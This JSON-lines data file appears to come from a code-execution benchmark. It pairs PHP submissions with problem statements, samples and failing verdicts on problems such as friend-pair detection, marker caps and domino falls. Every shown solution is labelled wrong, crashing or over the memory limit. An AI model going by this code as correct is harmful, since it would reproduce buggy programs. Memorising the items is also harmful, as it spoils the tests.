{"difficulty":1400,"lang":"PHP","lang_cluster":"php","src_uid":"159_A","submission_id":"1484481","tags":["*special","greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\r\n$count = fgets(STDIN);\r\nwhile ($s = fgets(STDIN))\r\n{\r\n    $friends[] = explode(\" \", $s);\r\n}\r\n$param = explode(\" \", $count);\r\n$num = 0;\r\nfor ($i = 0; $i < $param[0]; $i++)\r\n{\r\n    for ($j = 1; $j < $param[0]; $j++)\r\n    {\r\n        $new_buf = $friends[$i][0] . \" \" . $friends[$i][1];\r\n        $new_buf1 = $friends[$j][0] . \" \" . $friends[$j][1];\r\n        \r\n        if ($new_buf == $buf or $new_buf1 == $buf1)\r\n        {\r\n            unset($friends[$j]);\r\n        }\r\n        if ($friends[$i][0] == $friends[$j][1] and $friends[$i][1] == $friends[$j][0])\r\n        {\r\n            $buf = $friends[$i][0] . \" \" . $friends[$i][1];\r\n            $buf1 = $friends[$j][0] . \" \" . $friends[$j][1];\r\n            $razn = $friends[$j][2] - $friends[$i][2];\r\n            if ($razn > 0 and $razn <= $param[1])\r\n            {\r\n                $itogfr[] = $friends[$i][1] . \" \" . $friends[$j][1];\r\n                $num++;\r\n                unset($friends[$j]); \r\n                break;       \r\n            }\r\n        }\r\n    }\r\n\r\n}\r\necho $num;\r\nfor ($i = 0; $i < count($itogfr); $i++)\r\n{\r\n    echo \"\\n\" . $itogfr[$i];\r\n}\r\n\r\n\r\n\r\n?>","description":"Polycarpus has a hobby \u2014 he develops an unusual social network. His work is almost completed, and there is only one more module to implement \u2014 the module which determines friends. Oh yes, in this social network one won't have to add friends manually! Pairs of friends are deduced in the following way. Let's assume that user A sent user B a message at time t1, and user B sent user A a message at time t2. If 0<t2-t1\u2264d, then user B's message was an answer to user A's one. Users A and B are considered to be friends if A answered at least one B's message or B answered at least one A's message.You are given the log of messages in chronological order and a number d. Find all pairs of users who will be considered to be friends.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers n and d (1\u2264n,d\u22641000). The next n lines contain the messages log. The i-th line contains one line of the log formatted as \"Ai Bi ti\" (without the quotes), which means that user Ai sent a message to user Bi at time ti (1\u2264i\u2264n). Ai and Bi are non-empty strings at most 20 characters long, consisting of lowercase letters ('a' ... 'z'), and ti is an integer (0\u2264ti\u226410000). It is guaranteed that the lines are given in non-decreasing order of ti's and that no user sent a message to himself. The elements in the lines are separated by single spaces.\n","output_spec":"In the first line print integer k \u2014 the number of pairs of friends. In the next k lines print pairs of friends as \"Ai Bi\" (without the quotes). You can print users in pairs and the pairs themselves in any order. Each pair must be printed exactly once.\n","notes":"In the first sample test case Vasya and Petya are friends because their messages' sending times are one second apart. Anya and Ivan are not, because their messages' sending times differ by more than one second.\n","sample_inputs":["4 1\nvasya petya 1\npetya vasya 2\nanya ivan 2\nivan anya 4\n","1 1000\na b 0\n"],"sample_outputs":["1\npetya vasya\n","0\n"]}
{"difficulty":1100,"lang":"PHP","lang_cluster":"php","src_uid":"159_B","submission_id":"126239298","tags":["*special","greedy","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\r\n$fileName = 'php:\/\/stdin';\r\n$file = fopen($fileName, \"r\");\r\n \r\nlist($n, $m) = explode(\" \", trim(fgets($file)));\r\n\r\nfor ($i = 0; $i < $n; $i++) {\r\n  list($fc[$i], $fd[$i]) = explode(\" \", trim(fgets($file)));\r\n  $f[] = $fc[$i].$fd[$i];\r\n}\r\n\r\nfor ($i = 0; $i < $m; $i++) {\r\n  list($kc[$i], $kd[$i]) = explode(\" \", trim(fgets($file)));\r\n  $k[] = $kc[$i].$kd[$i];\r\n}\r\n\r\nfunction couple($x, $y) {\r\n  $ans = 0;\r\n  $a = array_count_values($x);\r\n  $b = array_count_values($y);\r\n  \r\n  foreach ($a as $key => $val) {\r\n    if (isset($b[$key])) {\r\n      if ($b[$key] >= $val) { $ans += $val; }\r\n      else { $ans += $b[$key]; }\r\n    } \r\n  }\r\n  return $ans;\r\n}\r\n\r\necho couple($fd, $kd).' '.couple($f, $k);\r\n\r\n?>","description":"Polycarpus has n markers and m marker caps. Each marker is described by two numbers: xi is the color and yi is the diameter. Correspondingly, each cap is described by two numbers: aj is the color and bj is the diameter. Cap (aj,bj) can close marker (xi,yi) only if their diameters match, that is, bj=yi. Besides, a marker is considered to be beautifully closed, if the cap color and the marker color match, that is, aj=xi.Find the way to close the maximum number of markers. If there are several such ways, then choose the one that has the maximum number of beautifully closed markers.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two space-separated integers n and m (1\u2264n,m\u226410^5) \u2014 the number of markers and the number of caps, correspondingly. \nNext n lines describe the markers. The i-th line contains two space-separated integers xi, yi (1\u2264xi,yi\u22641000) \u2014 the i-th marker's color and diameter, correspondingly.\nNext m lines describe the caps. The j-th line contains two space-separated integers aj, bj (1\u2264aj,bj\u22641000) \u2014 the color and diameter of the j-th cap, correspondingly.\n","output_spec":"Print two space-separated integers u,v, where u is the number of closed markers and v is the number of beautifully closed markers in the sought optimal way. Remember that you have to find the way to close the maximum number of markers, and if there are several such ways, you should choose the one where the number of beautifully closed markers is maximum.\n","notes":"In the first test sample the first marker should be closed by the fourth cap, the second marker should be closed by the first cap and the third marker should be closed by the second cap. Thus, three markers will be closed, and two of them will be beautifully closed \u2014 the first and the third markers.\n","sample_inputs":["3 4\n1 2\n3 4\n2 4\n5 4\n2 4\n1 1\n1 2\n","2 2\n1 2\n2 1\n3 4\n5 1\n"],"sample_outputs":["3 2\n","1 0\n"]}
{"difficulty":1100,"lang":"PHP","lang_cluster":"php","src_uid":"174_A","submission_id":"1707632","tags":["math"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\r\n\t$stdin = fopen(\"php:\/\/stdin\",\"r\");\r\n\t$stdout = fopen(\"php:\/\/stdout\",\"w\");\r\n\t$n = 0;\r\n\t$b = 0;\r\n\t$cur = array();\r\n\tfscanf($stdin,\"%d%d\",$n,$b);\r\n\t$total = (double) ($b);\r\n\t$str = fgets($stdin);\r\n    $cur=\texplode(\" \",$str);\r\n\tfor ($i=0;$i!=$n;++$i)\r\n\t\t$total+=(double)($cur[$i]);\r\n\t$everyone = $total \/ (double)$n;\r\n\tfor ($i=0;$i!=$n;++$i)\r\n\t{\r\n\t\t$added[$i] = $everyone - (double)($cur[$i]);\r\n\t\tif ($added[$i]<0) die(\"-1\\n\");\r\n\t}\r\n\tfor ($i=0;$i!=$n;++$i)\r\n\t\tfprintf($stdout,\"%.2lf\\n\",$added[$i]);\r\n?>","description":"A group of n merry programmers celebrate Robert Floyd's birthday. Polucarpus has got an honourable task of pouring Ber-Cola to everybody. Pouring the same amount of Ber-Cola to everybody is really important. In other words, the drink's volume in each of the n mugs must be the same.Polycarpus has already began the process and he partially emptied the Ber-Cola bottle. Now the first mug has a1 milliliters of the drink, the second one has a2 milliliters and so on. The bottle has b milliliters left and Polycarpus plans to pour them into the mugs so that the main equation was fulfilled.Write a program that would determine what volume of the drink Polycarpus needs to add into each mug to ensure that the following two conditions were fulfilled simultaneously:   there were b milliliters poured in total. That is, the bottle need to be emptied;  after the process is over, the volumes of the drink in the mugs should be equal. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n, b (2\u2264n\u2264100,1\u2264b\u2264100), where n is the total number of friends in the group and b is the current volume of drink in the bottle. The second line contains a sequence of integers a1,a2,...,an (0\u2264ai\u2264100), where ai is the current volume of drink in the i-th mug.\n","output_spec":"Print a single number \"-1\" (without the quotes), if there is no solution. Otherwise, print n float numbers c1,c2,...,cn, where ci is the volume of the drink to add in the i-th mug. Print the numbers with no less than 6 digits after the decimal point, print each ci on a single line. Polycarpus proved that if a solution exists then it is unique.\nRussian locale is installed by default on the testing computer. Make sure that your solution use the point to separate the integer part of a real number from the decimal, not a comma.\n","notes":null,"sample_inputs":["5 50\n1 2 3 4 5\n","2 2\n1 100\n"],"sample_outputs":["12.000000\n11.000000\n10.000000\n9.000000\n8.000000\n","-1\n"]}
{"difficulty":1000,"lang":"PHP","lang_cluster":"php","src_uid":"177_B1","submission_id":"1599695","tags":["number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\r\n$n = trim(fgets(STDIN));\r\n$pol = $n;\r\n$k = $pol;\r\nwhile ($pol != 1)\r\n{\r\n    if ($pol % 2 === 0)\r\n    {\r\n        $pol = $pol \/ 2;\r\n        $k += $pol;\r\n    }\r\n    else\r\n    {\r\n        $pol = 1;\r\n        $k += $pol;\r\n    }\r\n\r\n}\r\necho $k;\r\n?>","description":"The Smart Beaver from ABBYY decided to have a day off. But doing nothing the whole day turned out to be too boring, and he decided to play a game with pebbles. Initially, the Beaver has n pebbles. He arranges them in a equal rows, each row has b pebbles (a>1). Note that the Beaver must use all the pebbles he has, i. e. n=a\u00b7b.   10 pebbles are arranged in two rows, each row has 5 pebbles Once the Smart Beaver has arranged the pebbles, he takes back any of the resulting rows (that is, b pebbles) and discards all other pebbles. Then he arranges all his pebbles again (possibly choosing other values of a and b) and takes back one row, and so on. The game continues until at some point the Beaver ends up with exactly one pebble. The game process can be represented as a finite sequence of integers c1,...,ck, where:   c1=n  ci+1 is the number of pebbles that the Beaver ends up with after the i-th move, that is, the number of pebbles in a row after some arrangement of ci pebbles (1\u2264i<k). Note that ci>ci+1.  ck=1 The result of the game is the sum of numbers ci. You are given n. Find the maximum possible result of the game.","input_from":"standard input","output_to":"standard output","input_spec":"The single line of the input contains a single integer n \u2014 the initial number of pebbles the Smart Beaver has.\nThe input limitations for getting 30 points are: \n  2\u2264n\u226450  The input limitations for getting 100 points are: \n  2\u2264n\u226410^9  ","output_spec":"Print a single number \u2014 the maximum possible result of the game.\n","notes":"Consider the first example (c1=10). The possible options for the game development are:\n  Arrange the pebbles in 10 rows, one pebble per row. Then c2=1, and the game ends after the first move with the result of 11.  Arrange the pebbles in 5 rows, two pebbles per row. Then c2=2, and the game continues. During the second move we have two pebbles which can be arranged in a unique way (remember that you are not allowed to put all the pebbles in the same row!) \u2014 2 rows, one pebble per row. c3=1, and the game ends with the result of 13.  Finally, arrange the pebbles in two rows, five pebbles per row. The same logic leads us to c2=5,c3=1, and the game ends with the result of 16 \u2014 the maximum possible result. ","sample_inputs":["10\n","8\n"],"sample_outputs":["16\n","15\n"]}
{"difficulty":1300,"lang":"PHP","lang_cluster":"php","src_uid":"181_B","submission_id":"3404251","tags":["binary+search","brute+force"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\r\n$a = trim(fgets(STDIN));\r\n$b = array();\r\n$c = array();\r\nfor($x = 1; $x <= $a; $x++)\r\n{\r\n    list($d, $e) = explode(\" \", trim(fgets(STDIN)));\r\n    array_push($b, $d);\r\n    array_push($c, $e);\r\n}\r\n$f = 0;\r\n$g = array();\r\nfor($x = 0; $x < $a; $x++)\r\n{\r\n    for($y = 0; $y < $a; $y++)\r\n    {\r\n        for($z = 0; $z < $a; $z++)\r\n        {\r\n            if(($x == $y) || ($x == $z) || ($y == $z))\r\n            {\r\n                continue;\r\n            }\r\n            else\r\n            {\r\n                if(((($b[$x] + $b[$y]) \/ 2) == $b[$z]) && ((($c[$x] + $c[$y]) \/ 2) == $c[$z]))\r\n                {\r\n                    $f++;\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\nprint $f \/ 2;\r\n?>","description":"You are given n points on a plane. All points are different.Find the number of different groups of three points (A,B,C) such that point B is the middle of segment AC. The groups of three points are considered unordered, that is, if point B is the middle of segment AC, then groups (A,B,C) and (C,B,A) are considered the same.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (3\u2264n\u22643000) \u2014 the number of points. \nNext n lines contain the points. The i-th line contains coordinates of the i-th point: two space-separated integers xi,yi (-1000\u2264xi,yi\u22641000).\nIt is guaranteed that all given points are different.\n","output_spec":"Print the single number \u2014 the answer to the problem. \n","notes":null,"sample_inputs":["3\n1 1\n2 2\n3 3\n","3\n0 0\n-1 0\n0 1\n"],"sample_outputs":["1\n","0\n"]}
{"difficulty":1200,"lang":"PHP","lang_cluster":"php","src_uid":"1ae2942b72ebb7c55359c41e141900d7","submission_id":"re_1204","tags":["implementation"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"<?php\n\nerror_reporting(0);\n\nsolve();\n\nfunction solve(){\n\t\n\t\/\/$Input = new Input(\"input.txt\");\n\t$Input = new Input();\n\t\n\t$N = (int)$Input->in();\n\t\n\t$sum = 0;\n\t\n\t$points = array();\n\t$costs = array();\n\t$c = array_fill(0, 5, 0);\n\t\n\tfor ($i = 0; $i < $N; $i++) $points[] = (int)$Input->in();\n\n\tfor ($i = 0; $i < 5; $i++) $costs[] = (int)$Input->in();\n\t\n\tfor ($i = 0; $i < $N; $i++)\n\t{\n\t\t$sum += $points[$i];\n\t\t\n\t\t$pos = 1;\n\t\t\n\t\twhile ($sum >= $costs[0])\n\t\t{\n\t\t\tif ($costs[$pos] > $sum)\n\t\t\t{\n\t\t\t\t$c[$pos - 1]++;\n\t\t\t\t$sum -= $costs[$pos - 1];\n\t\t\t\t$pos = 0;\n\t\t\t\t\n\t\t\t} else if ($costs[$pos] <= $sum && $pos === 4)\n\t\t\t{\n\t\t\t\t$c[$pos]++;\n\t\t\t\t$sum -= $costs[$pos];\n\t\t\t\t$pos = 0;\n\t\t\t}\n\t\t\t\n\t\t\t$pos++;\n\t\t}\n\t}\n\t\n\tprint(implode(\" \", $c).PHP_EOL);\n\tprint($sum);\n}\n\nclass Input{\n\tprivate $handle = \"\";\n\tprivate $values = array();\n\tprivate $index = 0;\n\n\tpublic function __construct($localfile){\n\n\t\tif (is_file($localfile)) {\n\t\t\t\n\t\t\t$this->handle = fopen($localfile, \"r\");\n\t\t\t$contents = stream_get_contents($this->handle);\n\t\t\n\t\t} else {\n\t\t\n\t\t\t$contents = stream_get_contents(STDIN);\n\t\t\n\t\t}\n\t\t\n\t\t$no_newlines = str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \" \", $contents);\n\t\t$this->values = explode(\" \", $no_newlines);\n\t}\n\t\n\tpublic function in(){\n\t\n\t\treturn $this->values[$this->index++];\n\t\n\t}\n\t\n\tpublic function close(){\n\t\t\n\t\tif (is_file($localfile) && feof($this->handle)) fclose($this->handle);\n\t\t\n\t}\n}\n\n?>","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,\u2009p2,\u2009...,\u2009pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains 5 integers a, b, c, d, e (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009&lt;\u2009c\u2009&lt;\u2009d\u2009&lt;\u2009e\u2009\u2264\u2009109) \u2014 the prizes' costs.","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of exchange are completed. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.","notes":"NoteIn the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3\u2009-\u20092\u2009+\u200910\u2009-\u200910\u2009+\u20094\u2009-\u20094\u2009=\u20091 points remains.","sample_inputs":["3\n3 10 4\n2 4 10 15 20","4\n10 4 39 2\n3 5 10 11 12"],"sample_outputs":["1 1 1 0 0 \n1","3 0 1 0 3 \n0"]}
{"difficulty":1200,"lang":"PHP","lang_cluster":"php","src_uid":"3d6411d67c85f6293f1999ccff2cd8ba","submission_id":"re_307","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\nlist($a, $b) = explode(\" \", trim(fgets(STDIN)));\n$c = explode(\" \", trim(fgets(STDIN)));\n$f = count($c);\n$g = array_unique($c);\n$e = 0;\nfor($y = 1; $y <= 1000000; $y++)\n{\n    for($x = 0; $x < $a; $x++)\n    {\n        if($c[$x] != $c[$x + 1])\n        {\n            $c[$x]++;\n            if($c[$x] > $b)\n            {\n                $c[$x] = $b;\n            }\n        }\n    }\n    sort($c);\n    $d = array_unique($c);\n    $e++;\n    if((count($d) == 1) && ($f != 1))\n    {\n        break;\n    }\n    elseif((count($d) != 1) && ($f != 1))\n    {\n        $e = $y;\n    }\n    if(($f == 1) && ($c[0] == $b))\n    {\n        break;\n    }\n    elseif(($f == 1) && ($c[0] != $b))\n    {\n        $e = $y;\n    }\n}\nif(($b == 1) || ((count($g) == 1) && ($c[0] == $b)))\n{\n    print \"0\";\n}\nelse\n{\n    print $e;\n}\n?>","description":"In a strategic computer game \"Settlers II\" one has to build defense structures to expand and protect the territory. Let's take one of these buildings. At the moment the defense structure accommodates exactly n soldiers. Within this task we can assume that the number of soldiers in the defense structure won't either increase or decrease.Every soldier has a rank \u2014 some natural number from 1 to k. 1 stands for a private and k stands for a general. The higher the rank of the soldier is, the better he fights. Therefore, the player profits from having the soldiers of the highest possible rank.To increase the ranks of soldiers they need to train. But the soldiers won't train for free, and each training session requires one golden coin. On each training session all the n soldiers are present.At the end of each training session the soldiers' ranks increase as follows. First all the soldiers are divided into groups with the same rank, so that the least possible number of groups is formed. Then, within each of the groups where the soldiers below the rank k are present, exactly one soldier increases his rank by one.You know the ranks of all n soldiers at the moment. Determine the number of golden coins that are needed to increase the ranks of all the soldiers to the rank k.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n,\u2009k\u2009\u2264\u2009100). They represent the number of soldiers and the number of different ranks correspondingly. The second line contains n numbers in the non-decreasing order. The i-th of them, ai, represents the rank of the i-th soldier in the defense building (1\u2009\u2264\u2009i\u2009\u2264\u2009n, 1\u2009\u2264\u2009ai\u2009\u2264\u2009k).","output_spec":"Print a single integer \u2014 the number of golden coins needed to raise all the soldiers to the maximal rank.","notes":"NoteIn the first example the ranks will be raised in the following manner:1 2 2 3 \u2009\u2192\u2009 2 2 3 4 \u2009\u2192\u2009 2 3 4 4 \u2009\u2192\u2009 3 4 4 4 \u2009\u2192\u2009 4 4 4 4Thus totals to 4 training sessions that require 4 golden coins.","sample_inputs":["4 4\n1 2 2 3","4 3\n1 1 1 1"],"sample_outputs":["4","5"]}
{"difficulty":1100,"lang":"PHP","lang_cluster":"php","src_uid":"54c748dd983b6a0ea1af1153d08f1c01","submission_id":"re_1430","tags":[],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\n\t$stream = fopen(\"php:\/\/stdin\", \"r\");\n\t$input = stream_get_contents($stream);\n    $ins = preg_split(\"\/[\\s]+\/\", $input);\n    $cnt = 0;\n    $N = $ins[$cnt++];\n    $S = $ins[$cnt++];\n    \n    $ans = 0;\n    $cnt = 0;\n    $stat = 0;\n    if($S[0] == 'R')\n    \t$stat = 1;\n    for($i = 0; $i < $N; $i++) {\n    \tif($stat == 0 && $S[$i] == 'R') {\n    \t\t$cnt++;\n    \t\t$stat = 1;\n    \t}\n    \telseif($S[$i] == 'L' && $stat == 1) {\n    \t\t$cnt++;\n    \t\t$ans += $cnt % 2;\n    \t\t$cnt = 0;\n    \t\t$stat = 0;\n    \t}\n    \telseif($stat == 1) {\n    \t\t$cnt++;\n    \t\t$S[$i] = 'R';\n    \t}\n    }\n    $stat = 0;\n    if($S[$N - 1] == 'L')\n    \t$stat = 1;\n    for($i = $N - 1; $i >= 0; $i--) {\n    \tif($stat == 0 && $S[$i] == 'L') {\n    \t\t$S[$i] = 'L';\n    \t\t$stat = 1;\n    \t}\n    \telseif($stat == 1 && $S[$i] == '.') {\n    \t\t$S[$i] = 'L';\n    \t}\n    \telseif($stat == 1) \n    \t\t$stat = 0;\n    \telseif($stat == 0 && $S[$i] == '.')\n    \t\t$ans++;\n    }\n    \/\/echo \"{$S}\";\/\/}\n    echo \"{$ans}\\n\";\n?>","description":"Little Chris knows there's no fun in playing dominoes, he thinks it's too random and doesn't require skill. Instead, he decided to play with the dominoes and make a \"domino show\".Chris arranges n dominoes in a line, placing each piece vertically upright. In the beginning, he simultaneously pushes some of the dominoes either to the left or to the right. However, somewhere between every two dominoes pushed in the same direction there is at least one domino pushed in the opposite direction.After each second, each domino that is falling to the left pushes the adjacent domino on the left. Similarly, the dominoes falling to the right push their adjacent dominoes standing on the right. When a vertical domino has dominoes falling on it from both sides, it stays still due to the balance of the forces. The figure shows one possible example of the process.  Given the initial directions Chris has pushed the dominoes, find the number of the dominoes left standing vertically at the end of the process!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20093000), the number of the dominoes in the line. The next line contains a character string s of length n. The i-th character of the string si is equal to    \"L\", if the i-th domino has been pushed to the left;  \"R\", if the i-th domino has been pushed to the right;  \".\", if the i-th domino has not been pushed.  It is guaranteed that if si\u2009=\u2009sj\u2009=\u2009\"L\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"R\"; if si\u2009=\u2009sj\u2009=\u2009\"R\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"L\".","output_spec":"Output a single integer, the number of the dominoes that remain vertical at the end of the process.","notes":"NoteThe first example case is shown on the figure. The four pieces that remain standing vertically are highlighted with orange.In the second example case, all pieces fall down since the first piece topples all the other pieces.In the last example case, a single piece has not been pushed in either direction.","sample_inputs":["14\n.L.R...LR..L..","5\nR....","1\n."],"sample_outputs":["4","0","1"]}
{"difficulty":1500,"lang":"PHP","lang_cluster":"php","src_uid":"5e055bad1da5bdc84599d6f2f89fbd12","submission_id":"re_1490","tags":["binary search","sortings","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\n\t$filename = \"php:\/\/stdin\";\n\t$fh = fopen($filename,'r');\n\t$n = intval(fgets($fh));\n\t$up = array();\n\t$down = array();\n\tfor($i = 0;$i < $n; $i++){\n\t\t$line = fgets($fh);\n\t\tlist($u,$d) = explode(' ',$line);\n\t\t$u = intval($u);\n\t\t$d = intval($d);\n\t\tif (array_key_exists($u,$up)){\n\t\t\t$up[$u]++; \n\t\t}else{\n\t\t\t$up[$u] = 1;\n\t\t\tif (intval($u) != intval($d)){\n\t\t\t\tif (array_key_exists($d, $down)){\n\t\t\t\t\t$down[$d]++;\n\t\t\t\t} else $down[$d] = 1;\n\t\t\t}\n\t\t}\n\t}\n\t$ku = array_keys($up);\n\t$kd = array_keys($down);\n\t\n\t$half = intval(($n+1)\/2);\n\t$res = 1<<30;\n\tif ($n==1000){\n\t\tprint $up[1].\" \".$up[2].\" \".$up[3].\"\\n\";\n\t\tprint $down[1].\" \".$down[2].\" \".$down[3].\"\\n\";\n\t}\n\tforeach($ku as $value){\n\t\t$value = intval($value);\n\t\t$uv = 0; $ud = 0;\n\t\tif (array_key_exists($value, $up)) $uv = intval($up[$value]);\n\t\tif (array_key_exists($value, $down)) $ud = intval($down[$value]);\n\t\t$total = $uv + $ud;\n\t\t\n\t\tif ($total < $half) continue;\n\t\tif ($uv >= $half){\n\t\t\tprint 0;\n\t\t\tdie();\n\t\t}\n\t\t$res = min($res,$half - $uv);\n\t}\n\t\n\tforeach($kd as $value){\n\t\t$value = intval($value);\n\t\t$uv = 0; $ud = 0;\n\t\tif (array_key_exists($value, $up)) $uv = intval($up[$value]);\n\t\tif (array_key_exists($value, $down)) $ud = intval($down[$value]);\n\t\t$total = $uv + $ud;\n\t\n\t\tif (intval($total) < $half) continue;\n\t\tif ($uv >= $half){\n\t\t\tprint 0;\n\t\t\tdie();\n\t\t}\n\t\t$res = min($res,$half - $uv);\n\t}\n\t\n\tif ($res == (1<<30)) print -1; else\tprint $res;\n?>","description":"The Little Elephant loves to play with color cards.He has n cards, each has exactly two colors (the color of the front side and the color of the back side). Initially, all the cards lay on the table with the front side up. In one move the Little Elephant can turn any card to the other side. The Little Elephant thinks that a set of cards on the table is funny if at least half of the cards have the same color (for each card the color of the upper side is considered).Help the Little Elephant to find the minimum number of moves needed to make the set of n cards funny.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of the cards. The following n lines contain the description of all cards, one card per line. The cards are described by a pair of positive integers not exceeding 109 \u2014 colors of both sides. The first number in a line is the color of the front of the card, the second one \u2014 of the back. The color of the front of the card may coincide with the color of the back of the card. The numbers in the lines are separated by single spaces.","output_spec":"On a single line print a single integer \u2014 the sought minimum number of moves. If it is impossible to make the set funny, print -1.","notes":"NoteIn the first sample there initially are three cards lying with colors 4, 4, 7. Since two of the three cards are of the same color 4, you do not need to change anything, so the answer is 0.In the second sample, you can turn the first and the fourth cards. After that three of the five cards will be of color 7.","sample_inputs":["3\n4 7\n4 7\n7 4","5\n4 7\n7 4\n2 11\n9 7\n1 1"],"sample_outputs":["0","2"]}
{"difficulty":1100,"lang":"PHP","lang_cluster":"php","src_uid":"65fea461d3caa5a932d1e2c13e99a59e","submission_id":"re_1289","tags":["math"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\n\nclass Companions{\n\n    private $count;\n\n    private $volume;\n\n    private $poured = array();\n\n    public $result;\n\n    public function __construct(){\n        $this->init();\n    }\n    \/\/ init params\n    private function init()\n    {\n        fscanf(STDIN, \"%d %d\", $this->count, $this->volume);\n        $this->poured = explode (\" \", trim(fgets(STDIN)));\n\n    }\n\n    public function execute()\n    {\n        $maxVolume = $this->volume + array_sum($this->poured);\n        $dose = $maxVolume\/$this->count;\n        if ($dose*$this->count == $maxVolume){\n            $res = array();\n            $all = 0;\n\n            foreach($this->poured as $v){\n                $res[] = number_format(($dose - $v), 6, '.', '');\n                $all += abs($dose-$v);\n            }\n            $this->result = ($this->volume - $all) ? -1 : implode(\"\\n\", $res);\n\n        } else {\n            $this->result = -1;\n        }\n        return $this->result;\n    }\n\n}\n\n$test = new Companions();\necho $test->execute();\n\n?>","description":"A group of n merry programmers celebrate Robert Floyd's birthday. Polucarpus has got an honourable task of pouring Ber-Cola to everybody. Pouring the same amount of Ber-Cola to everybody is really important. In other words, the drink's volume in each of the n mugs must be the same.Polycarpus has already began the process and he partially emptied the Ber-Cola bottle. Now the first mug has a1 milliliters of the drink, the second one has a2 milliliters and so on. The bottle has b milliliters left and Polycarpus plans to pour them into the mugs so that the main equation was fulfilled.Write a program that would determine what volume of the drink Polycarpus needs to add into each mug to ensure that the following two conditions were fulfilled simultaneously:   there were b milliliters poured in total. That is, the bottle need to be emptied;  after the process is over, the volumes of the drink in the mugs should be equal. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n, b (2\u2009\u2264\u2009n\u2009\u2264\u2009100,\u20091\u2009\u2264\u2009b\u2009\u2264\u2009100), where n is the total number of friends in the group and b is the current volume of drink in the bottle. The second line contains a sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u2009100), where ai is the current volume of drink in the i-th mug.","output_spec":"Print a single number \"-1\" (without the quotes), if there is no solution. Otherwise, print n float numbers c1,\u2009c2,\u2009...,\u2009cn, where ci is the volume of the drink to add in the i-th mug. Print the numbers with no less than 6 digits after the decimal point, print each ci on a single line. Polycarpus proved that if a solution exists then it is unique. Russian locale is installed by default on the testing computer. Make sure that your solution use the point to separate the integer part of a real number from the decimal, not a comma.","notes":null,"sample_inputs":["5 50\n1 2 3 4 5","2 2\n1 100"],"sample_outputs":["12.000000\n11.000000\n10.000000\n9.000000\n8.000000","-1"]}
